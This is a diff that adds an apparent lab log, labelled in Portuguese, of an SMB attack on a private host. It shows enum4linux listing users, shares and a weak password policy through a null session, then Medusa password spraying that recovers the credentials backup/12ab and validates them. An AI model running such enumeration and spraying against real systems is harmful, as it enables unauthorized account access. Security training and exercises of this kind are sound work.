@@ -1,0 +1,163 @@
+== Ataque SMB: enumeracao e password spraying ==
+Host: 172.28.0.12
+Usuarios: /wordlists/trial1-users.txt (9 linhas)
+Spray: /wordlists/trial1-spray.txt (10 linhas)
+Log do Medusa: /logs/medusa-smb-20261029-121157.log
+Log do enum4linux: /home/cicerow/repos/cicerow/security-chalenge/logs/enum4linux-smb-20261029-121157.log
+Executando enum4linux...
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct 29 15:11:57 2026
+
+[34m =========================================( [0m[32mTarget Information[0m[34m )=========================================
+
+[0mTarget ........... 172.28.0.12
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+[34m ============================( [0m[32mEnumerating Workgroup/Domain on 172.28.0.12[0m[34m )============================
+
+[0m[33m
+[+] [0m[32mGot domain/workgroup name: WORKGROUP
+
+[0m
+[34m ====================================( [0m[32mSession Check on 172.28.0.12[0m[34m )====================================
+
+[0m[33m
+[+] [0m[32mServer 172.28.0.12 allows sessions using username '', password ''
+
+[0m
+[34m =================================( [0m[32mGetting domain SID for 172.28.0.12[0m[34m )=================================
+
+[0mDomain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[33m
+[+] [0m[32mCan't determine if host is part of domain or part of a workgroup
+
+[0m
+[34m ========================================( [0m[32mUsers on 172.28.0.12[0m[34m )========================================
+
+[0mindex: 0x1 RID: 0x3e8 acb: 0x00000010 Account: admin	Name: 	Desc: 
+index: 0x2 RID: 0x3ea acb: 0x00000010 Account: root	Name: root	Desc: 
+index: 0x3 RID: 0x3ec acb: 0x00000010 Account: test	Name: 	Desc: 
+index: 0x4 RID: 0x3e9 acb: 0x00000010 Account: administrator	Name: 	Desc: 
+index: 0x5 RID: 0x3eb acb: 0x00000010 Account: user	Name: 	Desc: 
+index: 0x6 RID: 0x3ed acb: 0x00000010 Account: guest	Name: 	Desc: 
+index: 0x7 RID: 0x3ee acb: 0x00000010 Account: support	Name: 	Desc: 
+index: 0x8 RID: 0x3ef acb: 0x00000010 Account: backup	Name: backup	Desc: 
+index: 0x9 RID: 0x3f0 acb: 0x00000010 Account: adm	Name: 	Desc: 
+
+user:[admin] rid:[0x3e8]
+user:[root] rid:[0x3ea]
+user:[test] rid:[0x3ec]
+user:[administrator] rid:[0x3e9]
+user:[user] rid:[0x3eb]
+user:[guest] rid:[0x3ed]
+user:[support] rid:[0x3ee]
+user:[backup] rid:[0x3ef]
+user:[adm] rid:[0x3f0]
+
+[34m ==================================( [0m[32mShare Enumeration on 172.28.0.12[0m[34m )==================================
+
+[0m
+	Sharename       Type      Comment
+	---------       ----      -------
+	labshare        Disk      
+	IPC$            IPC       IPC Service (Lab SMB)
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            D1A6948AF419
+[33m
+[+] [0m[32mAttempting to map shares on 172.28.0.12
+
+[0m//172.28.0.12/labshare	[35mMapping: [0mDENIED[35m Listing: [0mN/A[35m Writing: [0mN/A
+[33m
+[E] [0m[31mCan't understand response:
+
+[0mNT_STATUS_CONNECTION_REFUSED listing \*
+//172.28.0.12/IPC$	[35mMapping: [0mN/A[35m Listing: [0mN/A[35m Writing: [0mN/A
+
+[34m ============================( [0m[32mPassword Policy Information for 172.28.0.12[0m[34m )============================
+
+[0m[33m
+[E] [0m[31mUnexpected error from polenum:
+
+[0m/usr/lib/python3.14/getpass.py:99: GetPassWarning: Can not control echo on the terminal.
+  passwd = fallback_getpass(prompt, stream)
+Warning: Password input may be echoed.
+Password: Traceback (most recent call last):
+  File "/usr/lib/python3.14/getpass.py", line 73, in unix_getpass
+    old = termios.tcgetattr(fd)     # a copy to save
+termios.error: (25, 'Inappropriate ioctl for device')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/bin/polenum", line 305, in <module>
+    main()
+    ~~~~^^
+  File "/usr/bin/polenum", line 288, in main
+    passw = getpass.getpass()
+  File "/usr/lib/python3.14/getpass.py", line 99, in unix_getpass
+    passwd = fallback_getpass(prompt, stream)
+  File "/usr/lib/python3.14/getpass.py", line 143, in fallback_getpass
+    return _raw_input(prompt, stream, echo_char=echo_char)
+  File "/usr/lib/python3.14/getpass.py", line 183, in _raw_input
+    raise EOFError
+EOFError
+[33m
+[+] [0m[32mRetieved partial password policy with rpcclient:
+
+
+[0mPassword Complexity: Disabled
+Minimum Password Length: 5
+
+enum4linux complete on Thu Oct 29 15:11:59 2026
+
+Iniciando password spraying...
+Tentando senha: 12ab
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-10-29 15:11:59 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+Tentando senha: 34cd
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+Tentando senha: 56ef
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+Tentando senha: 78gh
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+Tentando senha: 90ij
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+Tentando senha: 01kl
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+Tentando senha: 23mn
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+Tentando senha: 45op
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+Tentando senha: 67qr
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+Tentando senha: 89st
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+Credenciais encontradas:
+2026-10-29 15:11:59 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+2026-10-29 15:11:59 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+OK: backup/12ab encontrado
+Validando credenciais com smbclient...
+OK: validado backup
+OK: validado backup
+== Ataque SMB concluido ==
+Tempo total: 00:00:04
